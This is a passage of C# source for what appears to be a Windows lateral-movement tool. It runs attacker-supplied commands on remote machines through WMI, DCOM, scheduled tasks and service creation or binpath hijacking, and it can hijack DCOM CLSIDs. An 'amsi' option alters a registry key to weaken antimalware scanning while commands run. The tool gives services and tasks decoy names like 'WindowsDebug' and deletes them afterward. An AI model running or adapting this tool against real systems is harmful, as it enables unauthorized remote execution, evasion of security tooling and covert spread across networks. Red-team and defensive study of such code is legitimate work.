                ManagementObject wmiservice = new ManagementObject(scope, new ManagementPath(srvpath), new ObjectGetOptions());
                wmiservice.Get();
                string origstate = wmiservice["State"].ToString();
                string origpath = wmiservice["PathName"].ToString();

                Console.WriteLine();
                Console.WriteLine("[+]  Original Service Information");
                Console.WriteLine("   [+] Service       :    {0}", wmiservice["Name"]);
                Console.WriteLine("   [+] Display name  :    {0}", wmiservice["DisplayName"]);
                Console.WriteLine("   [+] Bin path      :    {0}", wmiservice["PathName"]);
                Console.WriteLine();

                if (wmiservice["State"].ToString() == "Running")
                {
                    Console.WriteLine("[+]  Service running, stopping      :  {0}\n", servicename);
                    ManagementBaseObject outParam = wmiservice.InvokeMethod("StopService", null, null);
                }

                Console.WriteLine("[+]  Updating Service binpath       :  {0}", command);
                ManagementBaseObject inParams = wmiservice.GetMethodParameters("Change");
                inParams["PathName"] = command;
                wmiservice.InvokeMethod("Change", inParams, null);

                Console.WriteLine("[+]  Starting Service               :  {0}", servicename);
                ManagementBaseObject outParams = wmiservice.InvokeMethod("StartService", null, null);
                Console.WriteLine("[+]  Startup of service returned    :  {0}", outParams["returnValue"]);

                var x = Int32.Parse(outParams["returnValue"].ToString());
                if (x == 0)
                {
                    Thread.Sleep(5000);
                }

                Console.WriteLine("\n[+]  Stopping service");
                ManagementBaseObject outParam1 = wmiservice.InvokeMethod("StopService", null, null);

                Console.WriteLine("[+]  Resetting Service binpath      :  {0}", origpath);
                ManagementBaseObject inParams1 = wmiservice.GetMethodParameters("Change");
                inParams["PathName"] = origpath;
                wmiservice.InvokeMethod("Change", inParams, null);

                if (origstate == "Running")
                {
                    Console.WriteLine("[+]  Starting Service               :  {0}", servicename);
                    ManagementBaseObject outParams2 = wmiservice.InvokeMethod("StartService", null, null);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception   :   {0}", ex.Message));
            }
        }

        static void ModServiceRPC()
        {
            //TODO...maybe
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string username = "";
            string password = "";

            if (arguments.ContainsKey("username"))
            {
                if (!arguments.ContainsKey("password"))
                {
                    Usage();
                    return;
                }
                else
                {
                    username = arguments["username"];
                    password = arguments["password"];
                }
            }

            if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
            {
                Usage();
                return;
            }

            if (!arguments.ContainsKey("action"))
            {
                Usage();
                return;
            }

            if (arguments["action"].ToLower() == "query")
            {
                if (!arguments.ContainsKey("query"))
                {
                    Usage();
                    return;
                }

                if (arguments.ContainsKey("computername"))
                {
                    // remote query
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        if (arguments.ContainsKey("namespace"))
                        {
                            RemoteWMIQuery(computerName, arguments["query"], arguments["namespace"], username, password);
                        }
                        else
                        {
                            RemoteWMIQuery(computerName, arguments["query"], "", username, password);
                        }
                    }
                }
                else
                {
                    // local query
                    if (arguments.ContainsKey("namespace"))
                    {
                        LocalWMIQuery(arguments["query"], arguments["namespace"]);
                    }
                    else
                    {
                        LocalWMIQuery(arguments["query"]);
                    }
                }
            }

            else if (arguments["action"].ToLower() == "create")
            {
                // remote process call creation
                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string eventName = "Debug";

                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }
                        ManagementScope wmiConn = WMIConnect(computerName, username, password);
                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            Thread.Sleep(2000);
                            RemoteWMIExecute(wmiConn, arguments["command"]);
                            Thread.Sleep(2000);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            RemoteWMIExecute(wmiConn, arguments["command"]);
                        }
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if (arguments["action"].ToLower() == "executevbs")
            {
                if (arguments.ContainsKey("computername"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string eventName = "Debug";
                        string location = "local";
                        string droplocation = @"C:\Windows\Temp";
                        string filename = null;
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }
                        if (arguments.ContainsKey("location"))
                        {
                            location = arguments["location"];
                        }
                        if (arguments.ContainsKey("droplocation"))
                        {
                            droplocation = arguments["droplocation"];
                        }
                        if (arguments.ContainsKey("filename"))
                        {
                            filename = arguments["filename"];
                        }
                        else
                        {
                            Usage();
                            return;
                        }

                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            RemoteWMIExecuteVBS(computerName, eventName, username, password);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            RemoteWMIExecuteVBS(computerName, eventName, username, password);
                        }
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if (arguments["action"].ToLower() == "dcom")
            {
                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string method = "ShellBrowserWindow";
                        string eventName = "Debug";

                        if (arguments.ContainsKey("method"))
                        {
                            method = arguments["method"];
                        }
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }
                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            Thread.Sleep(2000);
                            RemoteDCOM(computerName, arguments["command"], method);
                            Thread.Sleep(2000);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            RemoteDCOM(computerName, arguments["command"], method);
                        }

                    }
                }
            }

            else if (arguments["action"].ToLower() == "taskscheduler")
            {
                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string taskname = "WindowsDebug";
                        string eventName = "Debug";

                        if (arguments.ContainsKey("taskname"))
                        {
                            taskname = arguments["taskname"];
                        }
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }
                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            Thread.Sleep(2000);
                            CreateSchTask(computerName, username, password, arguments["command"], taskname);
                            Thread.Sleep(2000);
                            DeleteSchTask(computerName, username, password, taskname);
                            Thread.Sleep(2000);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            CreateSchTask(computerName, username, password, arguments["command"], taskname);
                            Thread.Sleep(3000);
                            DeleteSchTask(computerName, username, password, taskname);
                        }
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if (arguments["action"].ToLower() == "scm")
            {
                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {

                        string servicename = "WindowsDebug";
                        string eventName = "Debug";

                        if (arguments.ContainsKey("servicename"))
                        {
                            servicename = arguments["servicename"];
                        }
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }
                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            Thread.Sleep(2000);
                            CreateService(computerName, servicename, arguments["command"]);
                            Thread.Sleep(2000);
                            DeleteService(computerName, servicename);
                            Thread.Sleep(2000);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            CreateService(computerName, servicename, arguments["command"]);
                            Thread.Sleep(2000);
                            DeleteService(computerName, servicename);
                        }
                    }
                }
            }

            else if (arguments["action"].ToLower() == "startservice")
            {
                if (arguments.ContainsKey("computername") && arguments.ContainsKey("servicename"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string servicename = string.Empty;

                        if (arguments.ContainsKey("servicename"))
                        {
                            servicename = arguments["servicename"];
                        }
                        StartService(computerName, servicename);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if (arguments["action"].ToLower() == "stopservice")
            {
                if (arguments.ContainsKey("computername") && arguments.ContainsKey("servicename"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string servicename = string.Empty;

                        if (arguments.ContainsKey("servicename"))
                        {
                            servicename = arguments["servicename"];
                        }
                        StopService(computerName, servicename);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if(arguments["action"].ToLower() == "hijackdcom")
            {
                if (arguments.ContainsKey("computername") && arguments.ContainsKey("clsid"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        string clsid = string.Empty;

                        if (arguments.ContainsKey("clsid"))
                        {
                            clsid = arguments["clsid"];
                        }
                        DCOMHijack(computerName, clsid);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if(arguments["action"].ToLower() == "modsvc")
            {
                if (arguments.ContainsKey("computername") && arguments.ContainsKey("command") && arguments.ContainsKey("servicename"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        //may implement RPC in the future
                        //string modtype = "wmi";
                        string servicename = string.Empty;

                        if (arguments.ContainsKey("servicename"))
                        {
                            servicename = arguments["servicename"];
                        }
                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            Thread.Sleep(2000);
                            ModServiceWMI(wmiConn, servicename, arguments["command"]);
                            Thread.Sleep(2000);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            ModServiceWMI(wmiConn, servicename, arguments["command"]);
                        }
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else if(arguments["action"].ToLower() == "modschtask")
            {
                if (arguments.ContainsKey("computername") && arguments.ContainsKey("command") && arguments.ContainsKey("taskname"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {

                        string taskname = string.Empty;
                        //For non-standard folders
                        string folder = "\\";
                        if (arguments.ContainsKey("taskname"))
                        {
                            taskname = arguments["taskname"];
                        }
                        if (arguments.ContainsKey("folder"))
                        {
                            folder = arguments["folder"];
                        }
                        if (arguments.ContainsKey("amsi") && arguments["amsi"] == "true")
                        {
                            ManagementScope wmiConn = WMIConnect(computerName, username, password);
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn);
                            Thread.Sleep(2000);
                            ModSchTask(computerName, username, password, arguments["command"], taskname, folder);
                            Thread.Sleep(2000);
                            UnsetRegKey(wmiConn, OriginalKey);
                        }
                        else
                        {
                            ModSchTask(computerName, username, password, arguments["command"], taskname, folder);
                        }
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }

            else
            {
                Usage();
                return;
            }
        }

        //Yes I'm aware this shouldn't be here, I'll fix it some other time
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll")]
        private static extern int StartService(IntPtr serviceHandle, int dwNumServiceArgs, string lpServiceArgVectors);

        [DllImport("advapi32.dll")]
        public static extern int DeleteService(IntPtr serviceHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, SERVICE_ACCESS dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool ChangeServiceConfig(
            IntPtr hService,
            uint nServiceType,
            uint nStartType,
            uint nErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            [In] char[] lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        [DllImport("Advapi32.dll")]
        public static extern IntPtr CreateService(
            IntPtr serviceControlManagerHandle,
            string lpSvcName,
            string lpDisplayName,
            SERVICE_ACCESS dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", EntryPoint = "CloseServiceHandle")]
        private static extern int CloseServiceHandle(IntPtr hSCObject);

        private const uint SC_MANAGER_CONNECT = 0x0001;
        private const uint SC_MANAGER_CREATE_SERVICE = 0x00002;
        private const uint SERVICE_QUERY_CONFIG = 0x00000001;
        private const uint SERVICE_CHANGE_CONFIG = 0x00000002;
        private const uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
        private const uint SERVICE_START = 0x0010;
        private const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
        private const uint SERVICE_AUTO_START = 0x00000002;
        private const uint SERVICE_ERROR_NORMAL = 0x00000001;

        public enum ServiceStartupType : uint
        {
            BootStart = 0,
            SystemStart = 1,
            Automatic = 2,
            Manual = 3,
            Disabled = 4
        }

        [Flags]
        public enum SERVICE_ACCESS : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_STATUS = 0x00004,
            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
            SERVICE_START = 0x00010,
            SERVICE_STOP = 0x00020,
            SERVICE_PAUSE_CONTINUE = 0x00040,
            SERVICE_INTERROGATE = 0x00080,
            SERVICE_USER_DEFINED_CONTROL = 0x00100,
            SERVICE_ALL_ACCESS =
                (STANDARD_RIGHTS_REQUIRED | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_START | SERVICE_STOP | SERVICE_PAUSE_CONTINUE
                 | SERVICE_INTERROGATE | SERVICE_USER_DEFINED_CONTROL)
        }

        private static object NewMethod(Type ComType)
        {
            return Activator.CreateInstance(ComType);
        }
    }
}
